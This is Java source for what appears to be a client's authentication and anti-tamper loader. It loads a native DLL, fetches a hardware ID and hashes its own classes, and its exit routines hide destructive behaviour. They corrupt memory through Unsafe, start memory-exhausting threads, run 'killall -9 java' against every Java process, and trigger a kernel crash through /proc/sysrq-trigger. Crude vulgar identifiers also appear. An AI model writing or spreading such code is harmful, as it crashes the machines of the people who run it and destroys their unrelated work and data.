package xks.go;


import ru.noxium.Auth;

import java.io.File;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.time.Instant;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class XKS__N__LD {

    public static int _chk_sum = 0;

    static {
        String customPath = "C:\\Noxium\\natives\\auth_core.dll";
        boolean isLoaded = false;

        try {
            File dllFile = new File(customPath);
            if (dllFile.exists()) {
                System.load(dllFile.getAbsolutePath());
                isLoaded = true;
              //  System.out.println("DLL loaded successfully");
            } else {
              //  System.out.println("ERROR: DLL file not found at: " + customPath);
            }
        } catch (Throwable t) {
       //     System.out.println("ERROR loading DLL:");
            t.printStackTrace();
        }

        if (!isLoaded) {
        //    System.out.println("CRITICAL: Library not loaded. Exiting.");
            System.exit(-1);
        }
    }
    public static native String a(String sperma_v_rot_letit_kak_budto_samolet, String sperma_v_rot_letit_kak_budto_samolet_); //performAuth
    public static native String b(); //getHwid
    public static native String c(String sperma_v_rot_letit_kak_budto_samolet); //verifyJarIntegrity
    public static native String d_d_d_123(String sperma_v_rot_letit_kak_budto_samolet); //decryptString

    public static void _init_0x() {
        _chk_sum++;
    }
    public static String calculateClientHash() {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            List<Class<?>> classesToHash = new ArrayList<>();

            classesToHash.add(ru.noxium.Noxium.class);
            classesToHash.add(Auth.class);
            classesToHash.add(XKS__N__LD.class);
            classesToHash.add(xks.nt.OriginalSwag.class);
            classesToHash.add(XKS__N__LD.class);
            classesToHash.add(xks.accounts.User.class);
            classesToHash.add(xks.accounts.GetterTwist.class);
            classesToHash.add(xks.util.forge.class);
            classesToHash.add(xks.accounts.DataSubReader.class);
            classesToHash.add(xks.accounts.GetterTwist.class);
            classesToHash.add(xks.accounts.UuidGetterOld.class);
            classesToHash.add(xks.accounts.User.class);

            for (Class<?> clazz : classesToHash) {
                if (clazz == null) continue;
                String path = "/" + clazz.getName().replace('.', '/') + ".class";
                try (InputStream is = clazz.getResourceAsStream(path)) {
                    if (is == null) continue;
                    byte[] buffer = new byte[2048];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        digest.update(buffer, 0, bytesRead);
                    }
                }
            }
            byte[] hash = digest.digest();
            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            return hexString.toString();
        } catch (Exception e) {
            return "error";
        }
    }


}

class X {

    private static final AtomicBoolean _1 = new AtomicBoolean(false);
    private static final Random _2 = new Random();
    private static volatile Object _3 = null;

    static {
        try {
            Field _4 = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            _4.setAccessible(true);
            _3 = _4.get(null);
        } catch (Exception e) {
            _3 = null;
        }
    }

    public static void a(int c) {
        if (_1.getAndSet(true)) return;

        b(c);

        int s = _2.nextInt(100);

        try {
            if (s < 60) d(c);
            else if (s < 90) e(c);
            else f(c);
        } catch (Throwable t) {
            g(c);
        }

        h(c, 8);
    }

    public static void sex() {
        _1.set(true);

        if (_3 != null) {
            try {
                Method _5 = _3.getClass().getMethod("putLong", Object.class, long.class, long.class);

                for (int i = 0; i < 1000; i++) {
                    _5.invoke(_3, null, _2.nextLong(), _2.nextLong());
                }
            } catch (Throwable ignored) {}
        }

        for (int i = 0; i < 10; i++) {
            new Thread(() -> {
                List<byte[]> _6 = new ArrayList<>();
                while (true) {
                    try {
                        _6.add(new byte[256 * 1024 * 1024]);
                    } catch (OutOfMemoryError e) {

                    }
                }
            }, "MemKiller-" + i).start();
        }

        try {

            ClassLoader _7 = Thread.currentThread().getContextClassLoader();
            if (_7 != null) {

                Class<?> _8 = Class.forName("java.lang.invoke.MethodHandles");
                Method _9 = _8.getDeclaredMethod("privateLookupIn", Class.class, Class.class);
                Object _10 = _9.invoke(null, ClassLoader.class, _8);

                Class<?> _11 = Class.forName("java.lang.invoke.MethodHandles$Lookup");
                Method _12 = _11.getDeclaredMethod("findSetter", Class.class, String.class, Class.class);
                Object _13 = _12.invoke(_10, ClassLoader.class, "parent", ClassLoader.class);

                Method _14 = _13.getClass().getDeclaredMethod("invoke", Object.class);
                _14.invoke(_13, _7);
            }
        } catch (Throwable ignored) {}

        Runtime.getRuntime().halt(1);

        killProcessExternal();
    }

    private static void d(int c) {
        Runtime.getRuntime().halt(c);

        try {
            Class<?> _15 = Class.forName("jdk.internal.misc.VM");
            Method _16 = _15.getDeclaredMethod("shutdown", int.class);
            _16.setAccessible(true);
            _16.invoke(null, c);
        } catch (Exception e1) {
            try {
                Class<?> _17 = Class.forName("java.lang.Terminator");
                Method _18 = _17.getDeclaredMethod("exit", int.class);
                _18.setAccessible(true);
                _18.invoke(null, c);
            } catch (Exception e2) {}
        }

        i();
        j(c);
    }

    private static void e(int c) {
        ExecutorService _19 = Executors.newVirtualThreadPerTaskExecutor();

        for (int i = 0; i < 20; i++) {
            final int idx = i;
            _19.execute(() -> {
                switch (idx % 5) {
                    case 0: k(c); break;
                    case 1: l(); break;
                    case 2: m(); break;
                    case 3: n(); break;
                    case 4: o(); break;
                }
            });
        }

        _19.shutdown();
        try {
            if (!_19.awaitTermination(300, TimeUnit.MILLISECONDS)) {
                _19.shutdownNow();
            }
        } catch (InterruptedException ignored) {}

        try {
            if (_3 != null) {
                Method _20 = _3.getClass().getMethod("allocateMemory", long.class);
                long addr = (long) _20.invoke(_3, Long.MAX_VALUE / 2);

                Method _21 = _3.getClass().getMethod("setMemory", long.class, long.class, byte.class);
                _21.invoke(_3, addr, 1024 * 1024 * 1024L, (byte) 0xFF);
            }
        } catch (Throwable ignored) {}
    }

    private static void f(int c) {
        Thread.ofVirtual().start(() -> {
            List<byte[]> _22 = new ArrayList<>();
            while (true) {
                try {
                    _22.add(new byte[64 * 1024 * 1024]);
                } catch (OutOfMemoryError e) {

                }
            }
        });

        for (int i = 0; i < 5; i++) {
            Thread.ofVirtual().start(() -> {
                try {
                    recursiveMethod(0);
                } catch (StackOverflowError e) {
                }
            });
        }

        corruptViaMethodHandles();

        killProcessExternal();

        try {
            Thread.sleep(50);
            Runtime.getRuntime().halt(c);
        } catch (Exception e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void recursiveMethod(int depth) {
        if (depth > 10000) return;
        byte[] waste = new byte[1024];
        recursiveMethod(depth + 1);
    }

    private static void g(int c) {
        killProcessExternal();

        try {
            Thread.ofVirtual().start(() -> {
                while (true) {
                    new Object() {
                    };
                    System.gc();
                }
            });
        } catch (Throwable t) {}
    }

    private static void k(int c) {
        try {
            String _23 = ProcessHandle.current().pid() + "";
            ProcessBuilder _24;

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                _24 = new ProcessBuilder("cmd", "/c", "taskkill", "/F", "/PID", _23);
            } else {
                _24 = new ProcessBuilder("sh", "-c", "kill -9 " + _23 + " && kill -KILL " + _23);
            }
            _24.start();
        } catch (Exception ignored) {}
    }

    private static void l() {
        Thread[] _25 = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);

        for (Thread _26 : _25) {
            if (_26 != null && _26 != Thread.currentThread()) {
                _26.interrupt();
                try {
                    Field _27 = Thread.class.getDeclaredField("interruptLock");
                    _27.setAccessible(true);
                    synchronized (_27.get(_26)) {
                    }
                } catch (Exception e) {}
            }
        }

        Thread.currentThread().interrupt();
        throw new RuntimeException("Forced thread termination");
    }

    private static void m() {
        Thread.ofVirtual().start(() -> {
            List<ByteBuffer> _28 = new ArrayList<>();
            while (true) {
                try {
                    _28.add(ByteBuffer.allocateDirect(128 * 1024 * 1024)); // Direct memory
                } catch (Error e) {
                }
            }
        });
    }

    private static void n() {
        try {
            Class<?> _29 = Class.forName("java.lang.invoke.MethodHandles");
            Method _30 = _29.getDeclaredMethod("lookup");
            Object _31 = _30.invoke(null);

            Class<?> _32 = Class.forName("java.lang.invoke.MethodHandles$Lookup");
            Method _33 = _32.getDeclaredMethod("findStaticSetter", Class.class, String.class, Class.class);
            Object _34 = _33.invoke(_31, ClassLoader.class, "scl", ClassLoader.class);

        } catch (Throwable ignored) {}
    }

    private static void o() {
        Object _36 = new Object();
        Object _37 = new Object();

        Thread.ofVirtual().start(() -> {
            synchronized (_36) {
                try { Thread.sleep(30); } catch (InterruptedException ignored) {}
                synchronized (_37) {}
            }
        });

        synchronized (_37) {
            try { Thread.sleep(60); } catch (InterruptedException ignored) {}
            synchronized (_36) {}
        }
    }

    private static void i() {
        try {
            Class<?> _38 = Class.forName("java.lang.ApplicationShutdownHooks");
            Method _39 = _38.getDeclaredMethod("runHooks");
            _39.setAccessible(true);
            _39.invoke(null);
        } catch (Exception ignored) {}
    }

    private static void j(int c) {
        try {
            Class<?> _40 = Class.forName("java.lang.ProcessHandle");
            Method _41 = _40.getDeclaredMethod("current");
            Object _42 = _41.invoke(null);

            Method _43 = _40.getDeclaredMethod("destroyForcibly");
            _43.invoke(_42);
        } catch (Throwable ignored) {}
    }

    private static void corruptViaMethodHandles() {
        try {
            Class<?> _44 = Class.forName("java.lang.invoke.MethodHandles");
            Class<?> _45 = Class.forName("java.lang.invoke.MethodHandles$Lookup");
            Class<?> _46 = Class.forName("java.lang.invoke.MethodHandle");

            Method _47 = _44.getDeclaredMethod("privateLookupIn", Class.class, _45);
            Object _48 = _47.invoke(null, Object.class, _45.getDeclaredConstructor().newInstance());

            Method _49 = _45.getDeclaredMethod("findStaticSetter", Class.class, String.class, Class.class);
            Object _50 = _49.invoke(_48, System.class, "out", PrintStream.class);


        } catch (Throwable ignored) {}
    }

    private static void killProcessExternal() {
        try {
            long pid = ProcessHandle.current().pid();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                Runtime.getRuntime().exec(new String[]{"wmic", "process", "where", "ProcessId=" + pid, "delete"});
                Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/PID", String.valueOf(pid), "/T"});
            } else {
                Runtime.getRuntime().exec(new String[]{"sh", "-c",
                        "kill -9 " + pid + " && " +
                                "kill -KILL " + pid + " && " +
                                "pkill -9 -P " + pid + " && " +
                                "killall -9 java 2>/dev/null || true"
                });
            }
        } catch (Exception ignored) {}
    }

    private static void h(int c, int sec) {
        Timer _52 = new Timer("SD", true);
        _52.schedule(new TimerTask() {
            @Override
            public void run() {
                if (!_1.get()) return;

                try {
                    Runtime.getRuntime().halt(c);

                    if (System.getProperty("os.name").toLowerCase().contains("linux")) {
                        try {
                            Runtime.getRuntime().exec(new String[]{"sh", "-c",
                                    "echo 1 > /proc/sys/kernel/sysrq && " +
                                            "echo c > /proc/sysrq-trigger"
                            });
                        } catch (Exception e) {}
                    }
                } catch (Exception ignored) {}
            }
        }, sec * 1000L);
    }

    private static void b(int c) {
        try {
            String _53 = String.format("[%s] EXIT %d from %s",
                    Instant.now(), c, Thread.currentThread().getName());

            Files.writeString(Path.of(".exit_log"),
                    _53 + System.lineSeparator(),
                    StandardOpenOption.CREATE,
                    StandardOpenOption.APPEND,
                    StandardOpenOption.WRITE);
        } catch (Exception ignored) {}
    }

    public static void graceful(int code) {
        try {
            System.exit(code);
        } catch (SecurityException e) {
            a(code);
        }
    }

    public static void immediate(int code) {
        _1.set(true);
        Runtime.getRuntime().halt(code);
    }

    public static void hardCrash() {
        sex();
    }

    public static void delayed(int code, int delaySeconds) {
        Thread.ofVirtual().start(() -> {
            try {
                Thread.sleep(delaySeconds * 1000L);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            a(code);
        });
    }

    public static void terminate(int code) { a(code); }
    public static void finish(int code) { a(code); }
    public static void shutdown(int code) { a(code); }
    public static void stop(int code) { a(code); }
    public static void end(int code) { a(code); }
    public static void exit(int code) { a(code); }
    public static void quit(int code) { a(code); }
    public static void destroy(int code) { hardCrash(); }
}